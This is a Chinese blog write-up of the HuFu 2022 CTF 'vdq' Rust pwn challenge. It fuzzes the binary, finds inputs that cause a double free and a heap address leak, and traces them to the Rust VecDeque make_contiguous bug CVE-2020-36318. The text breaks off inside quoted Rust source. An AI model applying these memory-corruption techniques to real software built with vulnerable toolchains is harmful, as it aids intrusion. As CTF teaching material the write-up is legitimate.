<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>虎符网络安全赛道 2022-pwn-vdq-WP - blog of chuj</title><link rel=icon type=image/png href=https://www.cjovi.icu/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="这次比赛里面出现了一个 rust pwn，到最后只有两解。我在比赛中只解出了此题，其实难度并不大，只是漏洞点光靠代码审计难以发现。这里简单分享一下我的"><meta property="og:image" content><meta property="og:title" content="虎符网络安全赛道 2022-pwn-vdq-WP"><meta property="og:description" content="这次比赛里面出现了一个 rust pwn，到最后只有两解。我在比赛中只解出了此题，其实难度并不大，只是漏洞点光靠代码审计难以发现。这里简单分享一下我的"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1617.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-03-21T18:25:00+00:00"><meta property="article:modified_time" content="2022-03-21T18:25:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="虎符网络安全赛道 2022-pwn-vdq-WP"><meta name=twitter:description content="这次比赛里面出现了一个 rust pwn，到最后只有两解。我在比赛中只解出了此题，其实难度并不大，只是漏洞点光靠代码审计难以发现。这里简单分享一下我的"><script src=https://www.cjovi.icu/js/feather.min.js></script>
<link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.858703d01d3c45e6b3e5964f9788e10759b7deb2158ea92653787f83364a9899.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>虎符网络安全赛道 2022-pwn-vdq-WP</h1><div class=meta>Posted on Mar 21, 2022</div></div><section class=body><p>这次比赛里面出现了一个 rust pwn，到最后只有两解。我在比赛中只解出了此题，其实难度并不大，只是漏洞点光靠代码审计难以发现。这里简单分享一下我的解题过程。</p><p>拿到手，先逆流程，rust 的程序反编译后比较难看，只能硬着头皮逆，不过程序没有去除符号，结构体的定义都在，相对会容易一点。首先可以分析出，在 <code>vdq::get_opr_lst</code> 中读取所有的操作，操作输入后反序列化到这里</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>core<span style=color:#666>::</span>result<span style=color:#666>::</span>Result<span style=color:#666>&lt;</span>alloc<span style=color:#666>::</span>vec<span style=color:#666>::</span>Vec<span style=color:#666>&lt;</span>vdq<span style=color:#666>::</span>Operation<span style=color:#666>&gt;</span>,serde_json<span style=color:#666>::</span>error<span style=color:#666>::</span>Error<span style=color:#666>&gt;</span> v29
</span></span></code></pre></div><p>这样就可以猜出输入的方式了</p><p><img src=https://www.cjovi.icu/usr/uploads/2022/03/1795721015.png alt=input></p><p>也就是输入序列化的字符串，如 [&ldquo;Add&rdquo;, &ldquo;Add&rdquo;, &ldquo;Remove&rdquo;]，然后起一新行以 &lsquo;$&rsquo; 结尾。</p><p>不过要注意的是这里 ida 对字符串的识别有点小问题，要注意 v9 这个变量描述了模式串的长度为 1。</p><p><img src=https://www.cjovi.icu/usr/uploads/2022/03/1798375159.png alt="match $"></p><p>从 ida 的 local types 中我们可以找到所有操作的枚举</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>enum</span> <span style=color:#0e84b5;font-weight:700>vdq</span><span style=color:#666>::</span><span style=color:#002070;font-weight:700>Operation</span> : <span style=color:#007020;font-weight:700>__int8</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span> Add <span style=color:#666>=</span> <span style=color:#40a070>0x0</span>,
</span></span><span style=display:flex><span> Remove <span style=color:#666>=</span> <span style=color:#40a070>0x1</span>,
</span></span><span style=display:flex><span> Append <span style=color:#666>=</span> <span style=color:#40a070>0x2</span>,
</span></span><span style=display:flex><span> Archive <span style=color:#666>=</span> <span style=color:#40a070>0x3</span>,
</span></span><span style=display:flex><span> View <span style=color:#666>=</span> <span style=color:#40a070>0x4</span>,
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>由此知道有五种操作。然后处理操作是在 <code>vdq::handle_opr_lst</code> 中做的。</p><p>所有的 Notes 被两个 vector 维护：</p><p><code>alloc::collections::vec_deque::VecDeque&lt;alloc::boxed::Box&lt;vdq::Note>> cache_note_vector;</code> 和</p><p><code>alloc::vec::Vec&lt;alloc::boxed::Box&lt;vdq::Note>> archive_note_vector;</code></p><p>Add 的 note 存在 cache_note_vector 中，Archive 的 note 存在 archive_note_vector 中。</p><p>说实话硬逆挺累的，也看不怎么懂，也看不到什么洞，所以就 fuzz 了一下，这里的 fuzz 使用的是我之前在对 byteCTF 2021 final 的 byteview 的 fuzz 思路，是一种无定向的，完全随机的，但是高度结构化的 fuzz 方法，可以参考我的<a href=https://cjovi.icu/fuzzing/1589.html>这篇博客</a>。对于一些 ctf 堆题确实是有奇效。这里提供一下我的脚本</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># fuzz.sh</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/bin/bash</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>while</span> <span style=color:#666>((</span>1<span style=color:#666>))</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>do</span> 
</span></span><span style=display:flex><span>    python ./vdq_input_gen.py &gt; poc
</span></span><span style=display:flex><span>    cat poc | ./vdq
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> <span style=color:#666>[</span> <span style=color:#bb60d5>$?</span> -ne <span style=color:#40a070>0</span> <span style=color:#666>]</span>; <span style=color:#007020;font-weight:700>then</span>
</span></span><span style=display:flex><span>        <span style=color:#007020>break</span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>fi</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>done</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># vdq_input_gen.py</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>import</span> <span style=color:#0e84b5;font-weight:700>random</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>import</span> <span style=color:#0e84b5;font-weight:700>string</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>operations <span style=color:#666>=</span> <span style=color:#4070a0>&#34;[&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>Add</span>():
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>global</span> operations
</span></span><span style=display:flex><span>    operations <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>Add</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>, &#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>Remove</span>():
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>global</span> operations
</span></span><span style=display:flex><span>    operations <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>Remove</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>, &#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>Append</span>():
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>global</span> operations
</span></span><span style=display:flex><span>    operations <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>Append</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>, &#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>View</span>():
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>global</span> operations
</span></span><span style=display:flex><span>    operations <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>View</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>, &#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>Archive</span>():
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>global</span> operations
</span></span><span style=display:flex><span>    operations <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>Archive</span><span style=color:#4070a0;font-weight:700>\&#34;</span><span style=color:#4070a0>, &#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>DoOperations</span>():
</span></span><span style=display:flex><span>    <span style=color:#007020>print</span>(operations[:<span style=color:#666>-</span><span style=color:#40a070>2</span>] <span style=color:#666>+</span> <span style=color:#4070a0>&#34;]&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020>print</span>(<span style=color:#4070a0>&#34;$&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>DoAdd</span>(message):
</span></span><span style=display:flex><span>    <span style=color:#007020>print</span>(message)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>DoAppend</span>(message):
</span></span><span style=display:flex><span>    <span style=color:#007020>print</span>(message)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>total_ops <span style=color:#666>=</span> random<span style=color:#666>.</span>randint(<span style=color:#40a070>1</span>, <span style=color:#40a070>100</span>)
</span></span><span style=display:flex><span>total_adds <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>total_append <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>total_remove <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>total_message <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(total_ops):
</span></span><span style=display:flex><span>    op <span style=color:#666>=</span> random<span style=color:#666>.</span>randint(<span style=color:#40a070>0</span>, <span style=color:#40a070>4</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> op <span style=color:#666>==</span> <span style=color:#40a070>0</span>:
</span></span><span style=display:flex><span>        total_message <span style=color:#666>+=</span> <span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>        total_adds <span style=color:#666>+=</span> <span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>        Add()
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>elif</span> op <span style=color:#666>==</span> <span style=color:#40a070>1</span>:
</span></span><span style=display:flex><span>        total_adds <span style=color:#666>-=</span> <span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>        Remove()
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>elif</span> op <span style=color:#666>==</span> <span style=color:#40a070>2</span>:
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> total_adds <span style=color:#666>&gt;</span> <span style=color:#40a070>0</span>:
</span></span><span style=display:flex><span>            total_append <span style=color:#666>+=</span> <span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>            total_message <span style=color:#666>+=</span> <span style=color:#40a070>1</span>
</span></span><span style=display:flex><span>            Append()
</span></span><span style=display:flex><span>        Append()
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>elif</span> op <span style=color:#666>==</span> <span style=color:#40a070>3</span>:
</span></span><span style=display:flex><span>        total_adds <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>        total_append <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>        total_remove <span style=color:#666>=</span> <span style=color:#40a070>0</span>
</span></span><span style=display:flex><span>        Archive()
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>elif</span> op <span style=color:#666>==</span> <span style=color:#40a070>4</span>:
</span></span><span style=display:flex><span>        View()
</span></span><span style=display:flex><span>DoOperations()
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(total_message):
</span></span><span style=display:flex><span>    DoAdd(<span style=color:#4070a0>&#39;&#39;</span><span style=color:#666>.</span>join(random<span style=color:#666>.</span>sample(string<span style=color:#666>.</span>ascii_letters <span style=color:#666>+</span> string<span style=color:#666>.</span>digits, random<span style=color:#666>.</span>randint(<span style=color:#40a070>1</span>, <span style=color:#40a070>40</span>))))
</span></span></code></pre></div><p>跑一下，很快（几秒钟）就会出 crash，我获得的是一个相对短小的 poc，可以造成段错误，随便修改尝试后获得了稳定造成 double free 的 poc</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#666>[</span><span style=color:#4070a0>&#34;Add&#34;</span>, <span style=color:#4070a0>&#34;Add&#34;</span>, <span style=color:#4070a0>&#34;Archive&#34;</span>, <span style=color:#4070a0>&#34;Add&#34;</span>, <span style=color:#4070a0>&#34;Archive&#34;</span>, <span style=color:#4070a0>&#34;Add&#34;</span>, <span style=color:#4070a0>&#34;Add&#34;</span>,  <span style=color:#4070a0>&#34;View&#34;</span>, <span style=color:#4070a0>&#34;Remove&#34;</span>, <span style=color:#4070a0>&#34;Remove&#34;</span>, <span style=color:#4070a0>&#34;Archive&#34;</span><span style=color:#666>]</span>
</span></span><span style=display:flex><span>$
</span></span><span style=display:flex><span>ZqlUYDS2I0WOQJvNdTX1onAmfcK6B8VFL5rytP
</span></span><span style=display:flex><span>C
</span></span><span style=display:flex><span>Pgl3h
</span></span><span style=display:flex><span>0S4iHUmpK16Vfbk
</span></span><span style=display:flex><span>LzvEUmWxMl
</span></span></code></pre></div><p>那么下一步自然是研究 poc，研究的时候尝试删掉各种操作看看会不会有影响，本来以为 View 不会造成什么影响，但是发现去掉之后就不会触发 double free 了。这很奇怪，所以又看了一下 view 部分的实现</p><p><img src=https://www.cjovi.icu/usr/uploads/2022/03/2525748681.png alt=view></p><p>感觉只有这里可能会有问题了，查了一下最近 rust 的 cve，找到了这个 <a href=https://www.cvedetails.com/cve/CVE-2020-36318/>CVE</a>，看了一下程序的 rust 版本</p><p><img src=https://www.cjovi.icu/usr/uploads/2022/03/1095982430.png alt=version></p><p>这个 <code>make_contiguous</code> 的 feature 1.48.0 被引入，1.49.0 修复，那这个大概就是了。</p><p>trace 了一下发现 double free 是在 handle_opr_lst 退出的时候发生的</p><p><img src=https://www.cjovi.icu/usr/uploads/2022/03/4160398693.png alt="on exit"></p><p>退出时会 drop 掉两个 vector，大体上就是一个 note 同时处于两个 vector 中了，然后就 double free 了。</p><p>这实际上就是说在 Archive 操作的时候，cache_note_vector 中的 notes 并没有被删除，view 一下看看，也就是这个操作</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span> <span style=color:#666>[</span><span style=color:#4070a0>&#34;Add&#34;</span>, <span style=color:#4070a0>&#34;Add&#34;</span>, <span style=color:#4070a0>&#34;Archive&#34;</span>, <span style=color:#4070a0>&#34;Add&#34;</span>, <span style=color:#4070a0>&#34;Archive&#34;</span>, <span style=color:#4070a0>&#34;Add&#34;</span>, <span style=color:#4070a0>&#34;Add&#34;</span>,  <span style=color:#4070a0>&#34;View&#34;</span>, <span style=color:#4070a0>&#34;Remove&#34;</span>, <span style=color:#4070a0>&#34;Remove&#34;</span>, <span style=color:#4070a0>&#34;Remove&#34;</span>, <span style=color:#4070a0>&#34;View&#34;</span><span style=color:#666>]</span>
</span></span><span style=display:flex><span> $
</span></span><span style=display:flex><span> 之后的字符串随便输
</span></span></code></pre></div><p><img src=https://www.cjovi.icu/usr/uploads/2022/03/455248981.png alt=leak></p><p>确实打印出来了乱七八糟的东西，仔细一看好像是堆地址，那就是可以 leak 了。</p><p>那么首先要搞懂为什么会出现这种情况</p><p>双端队列的结构：</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>alloc</span><span style=color:#666>::</span>collections<span style=color:#666>::</span>vec_deque<span style=color:#666>::</span>VecDeque<span style=color:#666>&lt;</span>alloc<span style=color:#666>::</span>boxed<span style=color:#666>::</span>Box<span style=color:#666>&lt;</span>vdq<span style=color:#666>::</span>Note<span style=color:#666>&gt;&gt;</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span> usize tail;
</span></span><span style=display:flex><span> usize head;
</span></span><span style=display:flex><span> alloc<span style=color:#666>::</span>raw_vec<span style=color:#666>::</span>RawVec<span style=color:#666>&lt;</span>alloc<span style=color:#666>::</span>boxed<span style=color:#666>::</span>Box<span style=color:#666>&lt;</span>vdq<span style=color:#666>::</span>Note<span style=color:#666>&gt;</span>,alloc<span style=color:#666>::</span>alloc<span style=color:#666>::</span>Global<span style=color:#666>&gt;</span> buf;
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>buf 里面存的就是每个元素了，tail 指向尾部元素，head 指向头部元素，但是要注意的是在内存中尾部元素在低地址，所以 tail 实际上小于 head。</p><p>在这个操作下<code>["Add", "Add", "Archive", "Add", "Archive", "Add", "Add", "View", "Remove", "Remove", "Remove", "View"]</code> 第一次 view 后，<code>cache_note_vector</code>（也就是这个 vec_deque）中有三个元素，tail = 1，head = 4，buf 里面是这样的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>0x555555a36f30: 0x0000555555a370f0     0x0000555555a36fd0
</span></span><span style=display:flex><span>0x555555a36f40: 0x0000555555a37050     0x0000555555a370a0
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>pwndbg&gt; x/20xg 0x7fffffffda60
</span></span><span style=display:flex><span>0x7fffffffda60: 0x0000000000000000      0x0000000000000004
</span></span><span style=display:flex><span>0x7fffffffda70: 0x0000555555a36f30      0x0000000000000004
</span></span></code></pre></div><p>以上面为例，连续指的是 buf 连续，也就是 buf 可以线性遍历（简单的说就是把循环队列转换为线性数组）。这里转换完成后，tail 变成 1，head 变成 4，即可返回一个可用的切片了。这里就是 CVE 的漏洞所在，修复后会返回一个 RingSlices</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Rust data-lang=Rust><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// 修复前
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>return</span><span style=color:#bbb> </span><span style=color:#007020;font-weight:700>unsafe</span><span style=color:#bbb> </span>{<span style=color:#bbb> </span><span style=color:#666>&amp;</span><span style=color:#007020;font-weight:700>mut</span><span style=color:#bbb> </span>self.buffer_as_mut_slice()[tail<span style=color:#666>..</span>head]<span style=color:#bbb> </span>};<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb></span><span style=color:#60a0b0;font-style:italic>// 修复后
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>return</span><span style=color:#bbb> </span><span style=color:#007020;font-weight:700>unsafe</span><span style=color:#bbb> </span>{<span style=color:#bbb> </span>RingSlices::ring_slices(self.buffer_as_mut_slice(),<span style=color:#bbb> </span>head,<span style=color:#bbb> </span>tail).<span style=color:#40a070>0</span><span style=color:#bbb> </span>};<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>    </span><span style=color:#007020;font-weight:700>fn</span> <span style=color:#06287e>ring_slices</span>(buf: <span style=color:#0e84b5;font-weight:700>Self</span>,<span style=color:#bbb> </span>head: <span style=color:#902000>usize</span>,<span style=color:#bbb> </span>tail: <span style=color:#902000>usize</span>)<span style=color:#bbb> </span>-&gt; (Self,<span style=color:#bbb> </span>Self)<span style=color:#bbb> </span>{<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span>contiguous<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>tail<span style=color:#bbb> </span><span style=color:#666>&lt;=</span><span style=color:#bbb> </span>head;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span><span style=color:#007020;font-weight:700>if</span><span style=color:#bbb> </span>contiguous<span style=color:#bbb> </span>{<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>            </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span>(empty,<span style=color:#bbb> </span>buf)<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>buf.split_at(<span style=color:#40a070>0</span>);<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>            </span>(buf.slice(tail,<span style=color:#bbb> </span>head),<span style=color:#bbb> </span>empty)<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span>}<span style=color:#bbb> </span><span style=color:#007020;font-weight:700>else</span><span style=color:#bbb> </span>{<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>            </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span>(mid,<span style=color:#bbb> </span>right)<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>buf.split_at(tail);<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>            </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span>(left,<span style=color:#bbb> </span>_)<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>mid.split_at(head);<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>            </span>(right,<span style=color:#bbb> </span>left)<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span>}<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>    </span>}<span style=color:#bbb>
</span></span></span></code></pre></div><p>我也不是很懂 rust，但是修复后大概就是把 buf 中所有的元素组成了一个 ring_slices（反映到内存里面就应该是把转换后的数组前面所有的元素移到后面，这样就不会加飞了）</p><p>修复前则是返回一个 plain 的 slice，这样就会加回到头部，造成 double free。我想洞大概就是这个原理。</p><p>所以为了 UAF，应该先构造出循环队列，也就是 head &lt; tail，并且让 make_contiguous 后内存中仍能剩余可用的指针。参考这段源码</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-rust data-lang=rust><span style=display:flex><span><span style=color:#bbb>    </span><span style=color:#007020>#[stable(feature = </span><span style=color:#4070a0>&#34;deque_make_contiguous&#34;</span><span style=color:#007020>, since = </span><span style=color:#4070a0>&#34;1.48.0&#34;</span><span style=color:#007020>)]</span><span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>    </span><span style=color:#007020;font-weight:700>pub</span><span style=color:#bbb> </span><span style=color:#007020;font-weight:700>fn</span> <span style=color:#06287e>make_contiguous</span>(<span style=color:#666>&amp;</span><span style=color:#007020;font-weight:700>mut</span><span style=color:#bbb> </span>self)<span style=color:#bbb> </span>-&gt; <span style=color:#007020>&amp;</span><span style=color:#0e84b5;font-weight:700>mut</span><span style=color:#bbb> </span>[T]<span style=color:#bbb> </span>{<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span><span style=color:#007020;font-weight:700>if</span><span style=color:#bbb> </span>self.is_contiguous()<span style=color:#bbb> </span>{<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>            </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span>tail<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>self.tail;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>            </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span>head<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>self.head;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>            </span><span style=color:#007020;font-weight:700>return</span><span style=color:#bbb> </span><span style=color:#007020;font-weight:700>unsafe</span><span style=color:#bbb> </span>{<span style=color:#bbb> </span><span style=color:#666>&amp;</span><span style=color:#007020;font-weight:700>mut</span><span style=color:#bbb> </span>self.buffer_as_mut_slice()[tail<span style=color:#666>..</span>head]<span style=color:#bbb> </span>};<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span>}<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span>buf<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>self.buf.ptr();<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span>cap<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>self.cap();<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span>len<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>self.len();<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span>free<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>self.tail<span style=color:#bbb> </span><span style=color:#666>-</span><span style=color:#bbb> </span>self.head;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span><span style=color:#007020;font-weight:700>let</span><span style=color:#bbb> </span>tail_len<span style=color:#bbb> </span><span style=color:#666>=</span><span style=color:#bbb> </span>cap<span style=color:#bbb> </span><span style=color:#666>-</span><span style=color:#bbb> </span>self.tail;<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>        </span><span style=color:#007020;font-weight:700>if</span><span style=color:#bbb> </span>free<span style=color:#bbb> </span><span style=color:#666>&gt;=</span><span style=color:#bbb> </span>tail_len<span style=color:#bbb> </span>{<span style=color:#bbb>
</span></span></span><span style=display:flex><span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>// there is enough free space to copy the tail in one go,
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>// this means that we first shift the head backwards, and then
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>// copy the tail to the correct position.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>//
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>// from: DEFGH....ABC
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#bbb>            </span><span style=color:#60a0b0;font-style:italic>// to:   ABCDEFGH....
